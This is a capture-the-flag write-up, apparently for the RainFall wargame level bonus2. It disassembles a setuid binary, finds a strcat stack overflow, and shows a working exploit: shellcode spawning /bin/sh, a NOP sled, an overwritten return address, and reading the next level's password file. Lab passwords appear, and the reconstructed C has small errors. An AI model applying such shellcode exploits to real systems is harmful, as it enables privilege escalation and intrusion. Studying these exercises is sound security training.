@@ -1,0 +1,352 @@
+# Access
+bonus1@RainFall:~$ su bonus2
+Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+# GATHER INFO
+# Analize the file
+## perm Sticky bit
+ls -lhtr 
+total 8.0K
+-rwsr-s---+ 1 bonus3 users 5.6K Mar  6  2016 bonus2
+### YES
+## any string
+bonus2@RainFall:~$ readelf -p .rodata
+bonus2@RainFall:~$
+### look like no
+## look for functions
+info functions @plt
+All functions matching regular expression "@plt":
+
+Non-debugging symbols:
+0x08048360  memcmp@plt -> overflow n -> is bigger than buffer size
+0x08048370  strcat@plt -> oveflow in not valid string -> strncpy
+0x08048380  getenv@plt -> env 
+0x08048390  puts@plt   -> print
+0x080483c0  strncpy@plt -> not null character in case str >= n
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048484  greetuser 
+0x08048529  main
+## look for the logic of the functions
+### Remember
+rep stos is a repeating store  instruction:  
+
+    eax holds the value to store (0).  
+    edi is the destination address.  
+    ecx (19) is the count of DWORDs (4 bytes each) to store.
+     
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048529 <+0>:	push   ebp
+   0x0804852a <+1>:	mov    ebp,esp       -> stack frame
+   0x0804852c <+3>:	push   edi
+   0x0804852d <+4>:	push   esi
+   0x0804852e <+5>:	push   ebx
+   0x0804852f <+6>:	and    esp,0xfffffff0 -> stack align
+   0x08048532 <+9>:	sub    esp,0xa0       -> local vars 160 B 
+   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3 -> num args == 3
+   0x0804853c <+19>:	je     0x8048548 <main+31> -> continue
+   0x0804853e <+21>:	mov    eax,0x1             -> else error
+   0x08048543 <+26>:	jmp    0x8048630 <main+263> -> jmp return main
+   0x08048548 <+31>:	lea    ebx,[esp+0x50] -> buffer esp + 80 B
+   0x0804854c <+35>:	mov    eax,0x0        -> '\0'
+   0x08048551 <+40>:	mov    edx,0x13       -> 19 * 4 B = 76 B length buff
+   0x08048556 <+45>:	mov    edi,ebx
+   0x08048558 <+47>:	mov    ecx,edx
+   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax -> fill with '\0' a buffer of length 76
+   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
+   0x0804855f <+54>:	add    eax,0x4                 -> &argv[1]
+   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]     -> argv[1]
+   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28 -> param strncpy n = 40 
+   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax  -> param strncpy src = argv[1]
+   0x08048570 <+71>:	lea    eax,[esp+0x50]           -> param strncpy dst = fill '\0' buff 76 B
+   0x08048574 <+75>:	mov    DWORD PTR [esp],eax      
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>  -> call # with a string of 40 not could abuse of not null cause is fill with '\0' until 76 B
+   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]  -> argv
+   0x0804857f <+86>:	add    eax,0x8                  -> &argv[2]
+   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]      -> argv[2]
+   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20 -> 32 B
+   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax  -> argv[2] src
+   0x08048590 <+103>:	lea    eax,[esp+0x50]           -> buffer write before
+   0x08048594 <+107>:	add    eax,0x28                 -> move 40 B the writed as Max before
+   0x08048597 <+110>:	mov    DWORD PTR [esp],eax      -> strncpy dst
+   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>  -> call  -> exploitable huge size an the buffer is moved.
+   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 -> "LANG"
+   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>    
+   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax 
+   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0  if getenv ret Null
+   0x080485ba <+145>:	je     0x8048618 <main+239> jmp error
+   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2 param size_t n
+   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d -> param 2 memcmp -> "fi"
+   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c] -> return getenv
+   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax -> param 1 memcmp
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> -> call
+   0x080485db <+178>:	test   eax,eax
+   0x080485dd <+180>:	jne    0x80485eb <main+194> -> return memcmp ! 0 continue
+   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1 -> global|extern .. var
+   0x080485e9 <+192>:	jmp    0x8048618 <main+239>  -> return greet user
+   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2 -> param n memcmp 2
+   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740 -> param 2 "nl" 
+   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c] -> return getenv
+   0x08048602 <+217>:	mov    DWORD PTR [esp],eax -> param 1
+   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>call
+   0x0804860a <+225>:	test   eax,eax
+   0x0804860c <+227>:	jne    0x8048618 <main+239> -> same check
+   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
+   0x08048618 <+239>:	mov    edx,esp
+   0x0804861a <+241>:	lea    ebx,[esp+0x50]
+   0x0804861e <+245>:	mov    eax,0x13
+   0x08048623 <+250>:	mov    edi,edx
+   0x08048625 <+252>:	mov    esi,ebx
+   0x08048627 <+254>:	mov    ecx,eax
+   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] cp buffer[76] to 
+   0x0804862b <+258>:	call   0x8048484 <greetuser> -> call to greetuser
+   0x08048630 <+263>:	lea    esp,[ebp-0xc]
+   0x08048633 <+266>:	pop    ebx
+   0x08048634 <+267>:	pop    esi
+   0x08048635 <+268>:	pop    edi
+   0x08048636 <+269>:	pop    ebp
+   0x08048637 <+270>:	ret    
+End of assembler dump.
+
+rep movs DWORD PTR es:[edi], DWORD PTR ds:[esi]    
+
+    Repeating move operation:             buffer[76]
+        Copies 19 DWORDs (76 bytes)  from the source (esi = esp + 0x50) to the destination (edi = esp).  
+        After each copy, both pointers (esi and edi) are incremented by 4 bytes  (since it‚Äôs a DWORD move).
+         
+    Result:  The memory block from [esp + 0x50] to [esp + 0x50 + 76] is copied to [esp] to [esp + 76].
+     
+p (char *)0x8048738
+$2 = 0x8048738 "LANG"
+p (char *)0x804873d
+$3 = 0x804873d "fi"
+p (char *)0x8048740
+$5 = 0x8048740 "nl"
+# Code
+int main(int argc, char **argv)
+{
+    char buffer[76] = {0};
+    void *LANG_ENV;
+    
+    if (argc != 3)
+	   return 1;
+    strncpy(buffer, argv[1], 40);
+    strncpy(buffer + 40, argv[2], 32);
+    LANG_ENV = getenv("LANG");
+    if (LANG_ENV)
+    {
+        if (!memcmp(LANG_ENV, "fi", 2))
+           g_var = 1;
+        else if (!memcmp(LANG_ENV, "fi", 2))
+           g_var = 2;
+    }
+    memcpy(buffer, esp, 76);
+    greetuser(buffer);
+    return 0;
+}
+disass greetuser
+Dump of assembler code for function greetuser:
+   0x08048484 <+0>:	push   ebp
+   0x08048485 <+1>:	mov    ebp,esp
+   0x08048487 <+3>:	sub    esp,0x58 -> 88 B
+   0x0804848a <+6>:	mov    eax,ds:0x8049988 -> global var 
+   0x0804848f <+11>:	cmp    eax,0x1 -> is 'fi'
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54> -> yes jmp 
+   0x08048494 <+16>:	cmp    eax,0x2  -> is 'nl'
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> -> yes jmp 
+   0x08048499 <+21>:	test   eax,eax  -> is zero
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134> -> yes concat
+   0x0804849d <+25>:	mov    edx,0x8048710 -> "Hello "
+   0x080484a2 <+30>:	lea    eax,[ebp-0x48] -> buffer of 72 B
+   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
+   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx -> copy 'Hell' as a DWORD
+   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4] move ptr
+   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx -> copy 'o ' as a WORD
+   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]-> copy '\0' as a Byte
+   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
+   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
+   0x080484ba <+54>:	mov    edx,0x8048717
+   0x080484bf <+59>:	lea    eax,[ebp-0x48]
+   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
+   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
+   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
+   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
+   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
+   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
+   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
+   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
+   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
+   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
+   0x080484e9 <+101>:	mov    edx,0x804872a
+   0x080484ee <+106>:	lea    eax,[ebp-0x48]
+   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
+   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
+   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
+   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
+   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
+   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
+   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
+   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
+   0x08048509 <+133>:	nop
+   0x0804850a <+134>:	lea    eax,[ebp+0x8] -> param
+   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax -> param 2
+   0x08048511 <+141>:	lea    eax,[ebp-0x48] -> buffer "Hello "
+   0x08048514 <+144>:	mov    DWORD PTR [esp],eax -> param1
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+   0x0804851c <+152>:	lea    eax,[ebp-0x48] -> buffer "Hello " + param
+   0x0804851f <+155>:	mov    DWORD PTR [esp],eax  -> param 1
+   0x08048522 <+158>:	call   0x8048390 <puts@plt>  print
+   0x08048527 <+163>:	leave  
+   0x08048528 <+164>:	ret    
+(gdb) p (char *)0x8048710
+$6 = 0x8048710 "Hello " 
+(gdb) p (char *)0x8048717
+$7 = 0x8048717 "Hyv√§√§ p√§iv√§√§ "
+(gdb) p (char *)0x804872a
+$8 = 0x804872a "Goedemiddag! "
+Flow Summary  
+
+The code generates a greeting message based on a global flag: 
+
+    Global Flag = 1 ('fi') :
+    Jumps to a ... same as "hello " but in another language"
+    Global Flag = 2 ('nl') :
+    Jumps to a ... same as "hello " but in another language"
+
+    in any moment is set the var to 0 maybe i we don't want bleeding noises whe need to use 'fi' or 'nl'.
+    Global Flag = Non-zero (but not 1/2) :
+    Skips the "Hello " setup and directly appends to an existing buffer (assumed initialized elsewhere). Weird may Sploitable
+    Global Flag = 0 (default) :
+    Constructs "Hello " in a buffer, appends another string (e.g., a name), and prints it.
+void greetuser(char *username)
+{
+    char buffer[72];
+
+    if (g_var == 1)
+       strcpy(buffer, "Hyv√§√§ p√§iv√§√§ ");
+    else if (g_var == 2)
+       strcpy(buffer, "Goedemiddag! ");
+    else if (!g_var)
+       strcpy(buffer, "Hello ");
+    strcat(buffer, username);
+    puts(buffer);
+}
+
+# Code
+info var
+All defined variables:
+Non-debugging symbols:
+0x08049988  language -> is the oficial name of g_var
+int main(int argc, char **argv)
+{
+    char buffer[76] = {0};
+    void *LANG_ENV;
+    
+    if (argc != 3)
+	   return 1;
+    strncpy(buffer, argv[1], 40);
+    strncpy(buffer + 40, argv[2], 160); -> may overflow 2nd argv
+    LANG_ENV = getenv("LANG");
+    if (LANG_ENV)
+    {
+        if (!memcmp(LANG_ENV, "fi", 2))
+           language = 1;
+        else if (!memcmp(LANG_ENV, "fi", 2))
+           language = 2;
+    }
+    memcpy(buffer, esp, 76);
+    greetuser(buffer);
+    return 0;
+}
+
+void greetuser(char *username)
+{
+    char buffer[72];
+
+    if (language == 1)
+       strcpy(buffer, "Hyv√§√§ p√§iv√§√§ ");
+    else if (language == 2)
+       strcpy(buffer, "Goedemiddag! ");
+    else if (!language)
+       strcpy(buffer, "Hello ");
+    strcat(buffer, username);
+    puts(buffer);
+}
+# launch for test what we see.
+bonus2@RainFall:~$ ltrace ./bonus2
+__libc_start_main(0x8048529, 1, 0xbffffd14, 0x8048640, 0x80486b0 <unfinished ...>
++++ exited (status 1) +++
+bonus2@RainFall:~$ ltrace ./bonus2 "" ""
+__libc_start_main(0x8048529, 3, 0xbffffcf4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffffbf0, "", 40)                           = 0xbffffbf0
+strncpy(0xbffffc18, "", 32)                           = 0xbffffc18
+getenv("LANG")                                        = "en_US.UTF-8"
+memcmp(0xbfffff12, 0x804873d, 2, 0xb7fff918, 0)       = -1
+memcmp(0xbfffff12, 0x8048740, 2, 0xb7fff918, 0)       = -1
+strcat("Hello ", "")                                  = "Hello "
+puts("Hello "Hello 
+)                                        = 7
++++ exited (status 7) +++
+
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Program received signal SIGSEGV, Segmentation fault.
+0x08040041 in ?? () -> no offset, maybe need a longer prefix to reach further.
+#unset LANG and repeat with a short offset
+run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? () -> no offset, maybe need a longer prefix to reach further.
+# set LANG to fi
+bonus2@RainFall:~$ export LANG='fi'
+bonus2@RainFall:~$ ./bonus2 a b
+Hyv√§√§ p√§iv√§√§ a
+# let's repeat offset 
+# Exploit
+## user input.
+### argv[1] >= 40 B -> not null char ended string in strncpy main.
+### argv[2] <= 32
+### on greetuser concat without check the size of the str
+### overflow return address greetuser.
+>>>>>>>>(gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Hyv√§√§ p√§iv√§√§ BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+Error while running hook_stop:
+No function contains program counter for selected frame.
+0x41366141 in ?? () -> 18 offset on argv[2].
+shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+prefix = 40 - 21 = 19 NOP (\x90)
+Inject the shellcode in argv[1] = 21 B
+
+## take the main_buffer addres
+b *main+35
+   0x08048548 <+31>:	lea    ebx,[esp+0x50] -> this is the buffer
+=> 0x0804854c <+35>:	mov    eax,0x0
+(gdb) p $esp + 0x50
+$2 = (void *) 0xbffffbb0
+main_buffer addres 0xbffffbb0
+##we got the shellstorm, the offset, the address.
+argv[1] = $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+argv[2] = $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xb0"[::-1] ' )
+let's launch in gdb to test we got the shell.
+Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêêêêjXôRh//shh/binâ„1…ÕÄBBBBBBBBBBBBBBBBBB∞˚ˇø
+process 3417 is executing new program: /bin/dash # -> look fine
+Error in re-setting breakpoint 7: Function "main" not defined.
+$ id
+uid=2012(bonus2) gid=2012(bonus2) groups=2012(bonus2),100(users)
+## All fine let's excalate without gdb.
+bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xfb\xb0"[::-1] ' )
+Hyv√§√§ p√§iv√§√§ êêêêêêêêêêêêêêêêêêêjXôRh//shh/binâ„1…ÕÄBBBBBBBBBBBBBBBBBB∞˚ˇø
+$ id
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+// pass 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
